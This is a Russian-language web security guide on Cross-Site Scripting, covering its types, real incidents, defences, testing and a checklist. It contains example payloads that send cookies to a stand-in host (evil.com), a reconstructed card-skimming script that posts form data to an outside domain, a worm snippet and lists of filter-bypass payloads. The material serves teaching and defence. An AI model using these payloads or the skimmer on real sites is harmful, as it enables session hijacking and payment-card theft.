## 1. Cross-Site Scripting (XSS)

### Что это такое

Cross-Site Scripting (XSS) — это уязвимость безопасности, которая позволяет злоумышленнику внедрить вредоносный код (обычно JavaScript) в веб-страницы, просматриваемые другими пользователями. XSS атаки происходят когда приложение включает недоверенные данные в веб-страницу без должной валидации или экранирования, или обновляет существующую страницу с пользовательскими данными через browser API, который может создавать HTML или JavaScript.

**CVSS Score:** 6.1 - 9.6 (в зависимости от контекста)
**CWE ID:** CWE-79
**OWASP Top 10:** A03:2021 – Injection

### Как работает механизм атаки

XSS эксплуатирует доверие, которое пользователь имеет к конкретному сайту. Атака работает следующим образом:

1. **Injection Point:** Злоумышленник находит место в приложении, где пользовательский ввод отображается на странице без должной санитизации
2. **Payload Delivery:** Вредоносный JavaScript код внедряется через это место (форма, URL параметр, cookie, и т.д.)
3. **Execution:** Браузер жертвы выполняет внедренный код в контексте уязвимого сайта
4. **Exploitation:** Вредоносный код получает доступ к cookies, session tokens, localStorage, может читать и модифицировать DOM, отправлять запросы от имени пользователя

**Критическое отличие от других атак:** XSS выполняется в контексте доверенного сайта, поэтому обходит Same-Origin Policy браузера.

### Типы XSS

#### 1.1 Reflected XSS (Отраженный)

**Характеристики:**
- Вредоносный код приходит из HTTP request (обычно URL параметр)
- Немедленно отражается в HTTP response
- Не сохраняется на сервере
- Требует социальной инженерии (жертва должна кликнуть на вредоносную ссылку)

**Пример сценария:**
```
1. Сайт имеет поиск: https://shop.com/search?q=<USER_INPUT>
2. Результат отображается: "Результаты для: <USER_INPUT>"
3. Злоумышленник создает ссылку:
   https://shop.com/search?q=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
4. Отправляет жертве через email/SMS (маскируя через URL shortener)
5. Жертва кликает, cookies отправлены злоумышленнику
```

**Impact:** Средний-Высокий (требует действия пользователя, но легко маскируется)

#### 1.2 Stored XSS (Хранимый)

**Характеристики:**
- Вредоносный код сохраняется на сервере (база данных, файл, кеш)
- Выполняется каждый раз когда зараженные данные запрашиваются
- Не требует социальной инженерии после внедрения
- Самый опасный тип XSS

**Пример сценария:**
```
1. Форум или раздел комментариев не санитизирует ввод
2. Злоумышленник оставляет комментарий:
   "Отличный товар! <script>fetch('http://evil.com/log?cookie='+document.cookie)</script>"
3. Комментарий сохраняется в базе данных
4. Каждый пользователь, просматривающий страницу, выполняет вредоносный скрипт
5. Массовая кража session tokens
```

**Impact:** Критический (автоматическое заражение всех посетителей)

**Реальный кейс — eBay 2014:**
Stored XSS в описаниях товаров позволял продавцам внедрять JavaScript в листинги. Злоумышленники создавали поддельные страницы оплаты, воровали credentials покупателей. Тысячи пользователей были скомпрометированы до обнаружения.

#### 1.3 DOM-based XSS

**Характеристики:**
- Уязвимость существует в client-side коде, а не на сервере
- Сервер может никогда не видеть вредоносный payload
- Происходит когда JavaScript берет данные из untrusted source (URL) и передает в dangerous sink (eval, innerHTML)
- Сложнее обнаружить традиционными WAF

**Пример сценария:**
```javascript
// Уязвимый код
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name');
document.getElementById('welcome').innerHTML = 'Welcome ' + name;

// Атака через URL:
// https://site.com/welcome?name=<img src=x onerror=alert(document.cookie)>
```

**Dangerous Sinks (опасные функции):**
- `element.innerHTML = ...`
- `element.outerHTML = ...`
- `document.write(...)`
- `document.writeln(...)`
- `eval(...)`
- `setTimeout(string, ...)`
- `setInterval(string, ...)`
- `Function(string)`

**Impact:** Средний-Высокий (требует условий на client-side, но обходит server-side защиту)

### Реальные кейсы с финансовым impact

#### British Airways (2018) - $230 миллионов

**Что произошло:**
Злоумышленники (группа Magecart) взломали сайт British Airways и внедрили вредоносный JavaScript в платежную форму. Скрипт был замаскирован под легитимную библиотеку Modernizr.

**Механизм:**
```javascript
// Вредоносный код перехватывал данные формы
document.querySelector('form').addEventListener('submit', function(e) {
    const cardData = {
        number: document.getElementById('card-number').value,
        cvv: document.getElementById('cvv').value,
        expiry: document.getElementById('expiry').value,
        name: document.getElementById('name').value
    };

    // Отправка на сервер злоумышленников
    fetch('https://baways.com/process.php', { // похоже на british airways
        method: 'POST',
        body: JSON.stringify(cardData)
    });
});
```

**Результат:**
- 380,000 платежных карт скомпрометированы
- Период атаки: 15 дней (не обнаружено сразу)
- Штраф GDPR: £20 миллионов ($26.5 млн)
- Общие потери включая компенсации: $230+ миллионов
- Репутационный ущерб: неисчислим

**Урок:** Даже крупные компании с security teams уязвимы. Supply chain атака через модифицированную библиотеку.

#### Twitter XSS Worm (2010) - "StalkDaily"

**Что произошло:**
DOM-based XSS через атрибут `onmouseover` в твитах.

**Механизм:**
```javascript
// Уязвимый код Twitter отображал твиты через innerHTML
// Злоумышленник опубликовал:
"Check this out! <span onmouseover='alert(\"XSS\")'>Hover me</span>"

// Эволюционировало в самораспространяющийся червь:
"@[username] <script>
  // Автоматически постить твит с этим же кодом
  $.post('/status/update', {status: document.body.innerHTML});
</script>"
```

**Результат:**
- За 1 час тысячи аккаунтов заражены
- Автоматическое распространение (как вирус)
- Скомпрометированы аккаунты знаменитостей и политиков
- Twitter экстренно закрыли на maintenance

**Урок:** XSS может стать вирусным. Один уязвимый endpoint может скомпрометировать всю платформу.

### Технические детали эксплуатации

#### Bypass техники

**1. Обход фильтров через encoding:**
```javascript
// HTML entity encoding
&#60;script&#62;alert('XSS')&#60;/script&#62;

// URL encoding
%3Cscript%3Ealert('XSS')%3C/script%3E

// Unicode encoding
\u003cscript\u003ealert('XSS')\u003c/script\u003e

// Base64 (через data URI)
<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
```

**2. Использование альтернативных тегов:**
```javascript
// Если <script> блокируется
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
```

**3. Обход через JavaScript URIs:**
```javascript
<a href="javascript:alert('XSS')">Click</a>
<form action="javascript:alert('XSS')">
```

**4. Prototype pollution для XSS:**
```javascript
// Загрязнение Object.prototype
Object.prototype.innerHTML = '<img src=x onerror=alert("XSS")>';

// Если приложение делает:
element[userControlledProperty] = value;
// И userControlledProperty = 'innerHTML'
```

### Методы защиты

#### 1. Input Validation (Валидация ввода)

**Whitelist подход:**
```javascript
// ✅ Правильно - разрешаем только безопасные символы
function sanitizeUsername(input) {
    // Только буквы, цифры, underscore
    return input.replace(/[^a-zA-Z0-9_]/g, '');
}

// ❌ Неправильно - пытаемся заблокировать опасные символы
function badSanitize(input) {
    return input.replace(/<script>/gi, ''); // Легко обойти
}
```

#### 2. Output Encoding (Экранирование вывода)

**Контекстное экранирование:**
```javascript
// HTML context
function escapeHTML(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;

    // Или вручную:
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}

// JavaScript context
function escapeJS(str) {
    return str
        .replace(/\\/g, '\\\\')
        .replace(/'/g, "\\'")
        .replace(/"/g, '\\"')
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r');
}

// URL context
function escapeURL(str) {
    return encodeURIComponent(str);
}
```

#### 3. Use Safe APIs

```javascript
// ❌ Опасно
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);

// ✅ Безопасно
element.textContent = userInput; // Всегда безопасно для текста
element.setAttribute('data-value', userInput); // Безопасно для атрибутов

// Для вставки HTML - используйте библиотеки санитизации
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

#### 4. Content Security Policy (CSP)

**Строгая политика:**
```html
<!-- Блокирует все inline скрипты и eval -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'nonce-{random}';
               object-src 'none';
               base-uri 'none';">
```

**Использование nonce для inline скриптов:**
```html
<!-- Сгенерировать уникальный nonce на сервере -->
<script nonce="2726c7f26c">
    // Только скрипты с правильным nonce выполнятся
    console.log('Safe script');
</script>
```

#### 5. Framework-specific защита

**React (автоматическое экранирование):**
```jsx
// ✅ Автоматически безопасно
<div>{userInput}</div>

// ❌ Опасно - явный opt-in
<div dangerouslySetInnerHTML={{__html: userInput}} />

// ✅ Безопасно с санитизацией
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}} />
```

**Vue (автоматическое экранирование):**
```vue
<!-- ✅ Безопасно -->
<div>{{ userInput }}</div>

<!-- ❌ Опасно -->
<div v-html="userInput"></div>

<!-- ✅ Безопасно с санитизацией -->
<div v-html="$sanitize(userInput)"></div>
```

### Как тестировать

#### Ручное тестирование

**Базовые payloads:**
```javascript
// Тест 1: Простой alert
<script>alert('XSS')</script>

// Тест 2: Event handler
<img src=x onerror=alert('XSS')>

// Тест 3: SVG
<svg onload=alert('XSS')>

// Тест 4: Encoded
&lt;script&gt;alert('XSS')&lt;/script&gt;

// Тест 5: JavaScript URI
<a href="javascript:alert('XSS')">click</a>
```

**Тестирование в разных контекстах:**
```javascript
// HTML body
<div>{PAYLOAD}</div>

// HTML attribute
<input value="{PAYLOAD}">

// JavaScript string
<script>var x = "{PAYLOAD}";</script>

// URL
<a href="{PAYLOAD}">

// CSS
<style>{PAYLOAD}</style>
```

#### Автоматизированное тестирование

**XSS Scanner:**
```bash
# OWASP ZAP
zap-cli quick-scan -s xss https://target.com

# Burp Suite (профессиональный)
# Включает продвинутый XSS scanner

# XSStrike (специализированный)
python xsstrike.py -u "https://target.com/search?q=test"
```

**Custom script для тестирования:**
```javascript
// test-xss.js
const payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    // ... еще 100+ payloads
];

async function testXSS(url, paramName) {
    for (const payload of payloads) {
        const testURL = `${url}?${paramName}=${encodeURIComponent(payload)}`;
        const response = await fetch(testURL);
        const html = await response.text();

        if (html.includes(payload)) {
            console.log(`[VULNERABLE] Found reflected XSS: ${payload}`);
        }
    }
}
```

### Контрольный чеклист

**Для разработчиков:**
- [ ] Используется `textContent` вместо `innerHTML` для пользовательских данных
- [ ] Все пользовательские input проходят валидацию (whitelist)
- [ ] Output экранируется контекстно (HTML, JS, URL, CSS)
- [ ] Используется DOMPurify или аналог для санитизации HTML
- [ ] CSP header настроен и включает nonce для inline скриптов
- [ ] Нет использования опасных функций: `eval()`, `Function()`, `setTimeout(string)`
- [ ] React/Vue компоненты не используют `dangerouslySetInnerHTML`/`v-html` без санитизации
- [ ] URL параметры валидируются перед использованием в DOM

**Для security review:**
- [ ] Code review включает проверку на XSS patterns
- [ ] Automated security testing в CI/CD pipeline
- [ ] Penetration testing проведено перед релизом
- [ ] Bug bounty program для обнаружения XSS
